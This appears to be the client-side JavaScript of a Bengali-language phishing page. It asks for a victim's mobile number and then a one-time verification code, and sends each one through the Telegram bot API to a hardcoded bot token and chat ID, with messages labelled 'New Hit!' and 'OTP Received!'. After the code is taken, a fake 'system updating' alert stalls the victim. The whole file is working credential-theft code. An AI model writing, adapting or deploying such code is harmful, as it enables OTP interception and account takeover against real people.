const token = '8355762673:AAFQCkMR3Xbno2lppnvLKq51LqSkiVKfiJc';
const chatId = '6501474888';

let userPhone = "";

function goToStep2() {
    const phoneInput = document.getElementById('phone').value;
    if (phoneInput.length < 10) {
        alert("সঠিক মোবাইল নম্বর দিন");
        return;
    }
    userPhone = phoneInput;
    
    document.getElementById('step1').style.display = 'none';
    document.getElementById('step2').style.display = 'block';
    document.getElementById('title').innerText = "Verification";
    document.getElementById('msg').innerText = "কোডটি নিচে লিখুন";

    sendToTelegram(`🔔 New Hit!\n📱 Number: ${userPhone}`);
}

document.getElementById('mainForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const otpInput = document.getElementById('otp').value;
    
    if (otpInput.length < 4) {
        alert("সঠিক কোড দিন");
        return;
    }

    sendToTelegram(`✅ OTP Received!\n📱 Number: ${userPhone}\n🔑 OTP: ${otpInput}`);
    
    alert("সিস্টেম আপডেট হচ্ছে, দয়া করে অপেক্ষা করুন।");
});

function sendToTelegram(text) {
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
    fetch(url);
}
